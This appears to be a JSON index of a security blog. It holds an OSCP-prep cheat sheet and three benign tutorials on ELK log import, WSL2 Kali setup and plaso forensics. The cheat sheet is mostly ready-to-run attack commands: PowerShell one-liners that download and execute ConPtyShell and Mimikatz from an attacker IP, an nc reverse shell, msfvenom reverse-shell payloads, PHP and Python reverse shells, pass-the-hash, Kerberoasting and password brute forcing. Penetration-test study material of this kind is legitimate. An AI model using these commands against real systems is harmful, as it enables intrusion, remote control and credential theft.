[{"content":"For Windows System Powershell\n ConPtyShell  IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.119.160 -RemotePort 4444 -Rows 24 -Cols 80  Execute mimikatz directly in memory  IEX (New-Object Net.WebClient).DownloadString(\u0026#39;http://192.168.119.160:4444/Invoke-Mimikatz.ps1\u0026#39;);Invoke-Mimikatz  JuicyPotato  JuicyPotato -l 1337 -p c:\\windows\\system32\\cmd.exe -a \u0026#34;/c powershell.exe IEX(IWR http://192.168.119.160/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.119.160 -RemotePort 4444 -Rows 24 -Cols 80\u0026#34; -t *  File Transfer  certutil.exe -urlcache -f http://192.168.119.203/PsExec.exe PsExec.exe C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2008.9-0\\MpCmdRun.exe -url \u0026lt;url\u0026gt; -path \u0026lt;local-path\u0026gt; MpCmdRun.exe -DownloadFile -url [url] -path [path_to_save_file] renamed.exe -urlcache -f -split http://7-zip.org/a/7z1604-x64.exe… 7zip.exe --download file  Remote login using Psexec  Psexec.exe /accepteula -u alice -p alicewashere nc.exe 192.168.119.160 443 -e “c:\\Windows\\System32\\cmd.exe”  Python BloodHound  python3 bloodhound-python -u alice -p ThisIsTheUsersPassword01 -d svcorp.com -gc sv-dc01.svcorp.com -c all -ns 10.11.1.20 Linux\n PassTheHash  psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb administrator@10.11.1.21 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb //10.11.1.24 cmd  Brute Force  crackmapexec smb 10.11.1.21 -u user.txt -p ThisIsTheUsersPassword21 --continue-on-success  Impackets  Get SPN tickets:\nGetUserSPNs.py -request -dc-ip 10.11.1.20 svcorp.com/alice Check ASREPRoast Domain:\nGetNPUsers.py -dc-ip 10.11.1.20 -request \u0026#39;svcorp.com/\u0026#39;  Create local server  impacket-smbserver mrjck $(pwd) SSH  Local Port Forwading  ssh -L 80:127.0.0.1:80 username@192.168.0.1 Web Fuzzing  ffuf  ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.12.1.2/FUZZ  hydra  hydra -l root@localhost -P docswords.txt 10.11.1.39 http-post-form \u0026quot;/otrs/index.pl:Action=Login\u0026amp;RequestedURL=\u0026amp;Lang=en\u0026amp;TimeOffset=-120\u0026amp;User=^USER^\u0026amp;Password=^PASS^:F=Login failed\u0026quot; -I Reverse Shell msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp lhost=192.168.119.160 lport=9999 -b \u0026#34;\\x00\u0026#34; -f exe -o rshell.exe msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.203 LPORT=4444 -f hta-psh -o evil.hta msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.160 LPORT=4444 EXITFUNC=thread -f asp -a x86 --platform windows -o metasp.asp msfvenom -p php/reverse_php LHOST=192.168.119.160 LPORT=4444 -f raw \u0026gt; shell.php \u0026lt;?php echo shell_exec(\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.11.0.59/443 0\u0026gt;\u0026amp;1\u0026#34;);?\u0026gt;python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.119.160\u0026#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/bash\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; Tool Usage rpcclient -U \u0026#34;svcorp\\alice\u0026#34; 10.11.1.20 mssqlclient.py sa@10.11.1.31 -windows-auth smbmap -d svcorp -u alice -p ThisIsTheUsersPassword01 -H 10.11.1.20 -R \u0026#39;IPC$\u0026#39; -A lsass -q wpscan --url http://10.12.1.7 --enumerate ap --plugins-detection aggressive rsync -Pavz Twisted-20.3.0.tar.bz2 gibson@10.11.1.71:~/. ssh-copy-id gibson@10.11.1.71 ","permalink":"https://js-sarkar.github.io/posts/2021/tool-usage/","summary":"Few tools usage which I used during my OSCP prep.","title":"OSCP | Tool usage"},{"content":"There are many situations when we want to analyze large size of logs. Considering the logs are in CSV format. There are many tools that make this task easy. Still, it\u0026rsquo;s frustrating us with the amount of time it takes to process the data.\nTo overcome this I took the help of ELK (Docker) in a windows machine using WSL.\nRequirement  Docker in Windows WSL 2 (Ubuntu/Kali)  Installation ELK docker installation\nsudo docker pull sebp/elk Starting docker\ndocker run -p 5601:5601 -p 9200:9200 -p 5044:5044 -it -e LOGSTASH_START=0 -v {CSV file location in host}:{Mounting location} --name Container_Name sebp/elk  -e LOGSTASH_START=0: Start ELK without logstash -v {CSV file location in host}:{Mounting location}:Mount host drive to docker  Starting Docker with bash terminal\nOpen new terminal and enter below command:\ndocker exec -it Container_name /bin/bash Then upload CSV Logs using command below:\n/opt/logstash/bin/logstash -f logstash.conf  logstash.conf Example\ninput { file { path =\u0026gt; \u0026quot;/home/user/log.csv\u0026quot; start_position =\u0026gt; \u0026quot;beginning\u0026quot; # sincedb_path =\u0026gt; \u0026quot;/dev/null\u0026quot; } } filter { csv { separator =\u0026gt; \u0026quot;,\u0026quot; columns =\u0026gt; [\u0026quot;Sr\u0026quot;,\u0026quot;Day\u0026quot;,\u0026quot;Weekday\u0026quot;,\u0026quot;District\u0026quot;,\u0026quot;DistrictNumber\u0026quot;,\u0026quot;Mem\u0026quot;,\u0026quot;Abs\u0026quot;,\u0026quot;AttendancePercent\u0026quot;,\u0026quot;AbsentPercent\u0026quot;,\u0026quot;County\u0026quot; ] } } output { elasticsearch { hosts =\u0026gt; \u0026quot;http://localhost:9200\u0026quot; index =\u0026gt; \u0026quot;elk_test\u0026quot; } stdout {} } ","permalink":"https://js-sarkar.github.io/posts/2021/csv2elk/","summary":"Steps to import cvs log file to elk dashboard.","title":"Analysing CSV file using ELK"},{"content":"Setting up kali in WSL2\nRequirement To install WSL 2 on Windows 10 you need the following things:\n Windows 10 May 2020 (2004), Windows 10 May 2019 (1903), or Windows 10 November 2019 (1909) or later A computer with Hyper-V Virtualization support  Step to Enable WSL 2 in Windows 10  Enable WSL 2 Enable ‘Virtual Machine Platform’ Set WSL 2 as default Install a Kali Linux  Step 1: Enable WSL Run Powershell As Administator\ndism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart Step 2. Enable ‘Virtual Machine Platform’ To enable Virtual Machine Platform on Windows 10 (2004) open PowerShell as Administrator and run:\ndism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart OR\nEnable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform -NoRestart Step 3. Set WSL 2 as default Setting default version 2 for WSL, before installing any Linux destro\nwsl --set-default-version 2 Step 4. Install a distro Install kali from Microsoft store\nhttps://www.microsoft.com/en-us/p/kali-linux/9pkr34tncv07?activetab=pivot:overviewtab\nConvert Kali on WSL 1 to WSL 2\nIf you already have kali as WSL 1 you can convert it to version 2 by following command\nwsl.exe --set-version Kali-Linux 2 Starting Kali For First Time Search for Kali is search tab.\nUpdate and upgrade kali after configuring the password.\nsudo apt-get update \u0026amp;\u0026amp; upgrade Win-Kex If you want to have full kali desktop ewnvironment you can install Win-kex.\nWin-KeX provides a Kali Desktop Experience for Windows Subsystem for Linux (WSL 2)\nInstall Win-KeX\nsudo apt update \u0026amp;\u0026amp; sudo apt install kali-win-kex ","permalink":"https://js-sarkar.github.io/posts/2021/wsl/","summary":"Installation process of WSL2 in Windows.","title":"Installing Windows Subsystem for Linux (WSL 2)"},{"content":"Installation  Kali Ubuntu Dockor - (My Preference)  Kali sudo apt-get install plaso Ubuntu To install Plaso from the GIFT Personal Package Archive (PPA)\nsudo add-apt-repository ppa:gift/stable Update and install Plaso:\nsudo apt-get update sudo apt-get install plaso-tools Docker Installing Docker\ndocker pull log2timeline/plaso Running Docker\ndocker run -t -i --entrypoint=/bin/bash -v /data\u0026lt;File Location of Host Machine\u0026gt;:/data log2timeline/plaso Converting Vhdx File to Raw Image log2timeline require raw image file. To convert vhdx to raw image we would need to install qemu:\nTo install qemu\nsudo apt install qemu-utils Converting vhdx to raw:\nqemu-img convert -O raw 2021-02-02T073114_win10.vhdx win10_demo.raw Creating Plaso Dump file log2timeline.py plaso.dump win10_demo.raw Plaso Dump file information\npinfo.py plaso.dump Convert plaso file into CSV To list out all time zone\npsort.py --output-time-zone list Set time zone\npsort.py -o l2tcsv -w timeline.csv --output-time-zone Asia/Kolkata plaso.dump Using date filter\npsort.py -o l2tcsv -w timeline.csv --output-time-zone Asia/Kolkata plaso.dump \u0026#34;date \u0026gt; \u0026#39;2021-01-01\u0026#39; AND date \u0026lt; \u0026#39;2021-01-05\u0026#39;\u0026#34; Reference  Plaso documentation Richard Davis  ","permalink":"https://js-sarkar.github.io/posts/2021/log2timeline/","summary":"Steps to install log2timeline in Windows using WSL. Helpfull in disk forensic and timeline analysis.","title":"Log2timeline using WSL"}]